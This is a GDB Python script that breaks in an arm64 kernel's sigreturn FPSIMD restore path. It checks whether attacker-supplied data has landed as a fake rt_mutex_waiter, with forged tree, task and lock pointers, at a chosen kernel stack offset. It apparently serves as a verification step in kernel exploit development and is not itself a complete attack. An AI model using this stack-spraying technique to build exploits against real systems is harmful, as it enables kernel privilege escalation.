import gdb
import sys
import struct

def log(msg):
    print(f"[VERIFY-SIGRET] {msg}", flush=True)

ADDR_ENTRY = 0xffffffc0102cf86c   # restore_fpsimd_context: after sub sp, sp, #0x220
ADDR_UPDATE = 0xffffffc0102cfe5c  # restore_fpsimd_context: right before fpsimd_update_current_state

class EntryBp(gdb.Breakpoint):
    def __init__(self):
        super().__init__(f"*{ADDR_ENTRY:#x}", gdb.BP_HARDWARE_BREAKPOINT, internal=False)

    def stop(self):
        try:
            sp = int(gdb.parse_and_eval("$sp"))
            stack_off = sp & 0x3fff
            log("=" * 68)
            log(f"[RESTORE_FPSIMD ENTRY] Hit at PC={hex(ADDR_ENTRY)}")
            log(f"  $sp: 0x{sp:016x} (Stack Offset: 0x{stack_off:04x})")
            log(f"  Destination buffer: 0x{sp:016x}..0x{sp+0x210:016x} (528 bytes)")
            log("=" * 68)
        except Exception as e:
            log(f"Error in EntryBp: {e}")
        return False

class UpdateBp(gdb.Breakpoint):
    def __init__(self):
        super().__init__(f"*{ADDR_UPDATE:#x}", gdb.BP_HARDWARE_BREAKPOINT, internal=False)

    def stop(self):
        try:
            sp = int(gdb.parse_and_eval("$sp"))
            stack_off = sp & 0x3fff
            log("=" * 68)
            log(f"[RESTORE_FPSIMD COPIED] Stamped buffer in kernel stack:")
            log(f"  Buffer Base: 0x{sp:016x} (Offset 0x{stack_off:04x})")

            # Check stamped waiter at offset 0x148
            waiter_addr = sp + 0x148
            waiter_off = waiter_addr & 0x3fff
            log(f"  Target Waiter Address: 0x{waiter_addr:016x} (Offset 0x{waiter_off:04x})")
            log("-" * 68)

            for i in range(0, 0x50, 8):
                val = int(gdb.parse_and_eval(f"*(unsigned long long *)({hex(waiter_addr + i)})"))
                label = ""
                if i == 0x00: label = "<- fake tree_entry"
                elif i == 0x18: label = "<- fake pi_tree_entry"
                elif i == 0x30: label = "<- fake task pointer"
                elif i == 0x38: label = "<- fake lock pointer"
                elif i == 0x40: label = "<- prio/wake_state"
                log(f"    [+0x{i:02x}] (0x{waiter_off + i:04x}): 0x{val:016x} {label}")

            sent_tree = int(gdb.parse_and_eval(f"*(unsigned long long *)({hex(waiter_addr + 0x00)})"))
            sent_lock = int(gdb.parse_and_eval(f"*(unsigned long long *)({hex(waiter_addr + 0x38)})"))

            if sent_tree == 0xaa11aa11aa11aa11 and sent_lock == 0xdd44dd44dd44dd44:
                log("-" * 68)
                log("[+] MATCH CONFIRMED: Sigreturn FPSIMD Frame Stamping succeeded!")
                log(f"[+] All 80 bytes of rt_mutex_waiter safely stamped at stack 0x{waiter_off:04x}..0x{waiter_off+0x50:04x}!")
                log(f"[+] Buffer spans 0x{stack_off:04x}..0x{stack_off+0x210:04x} (120 bytes headroom remaining).")
                log("-" * 68)
            else:
                log(f"[-] MISMATCH: Expected sentinels not found at offset 0x148.")
            log("=" * 68)
        except Exception as e:
            log(f"Error in UpdateBp: {e}")
        return False

log("Registering Sigreturn Hardware Breakpoints...")
EntryBp()
UpdateBp()
log("Breakpoints active. Continuing kernel execution...")
gdb.execute("continue")
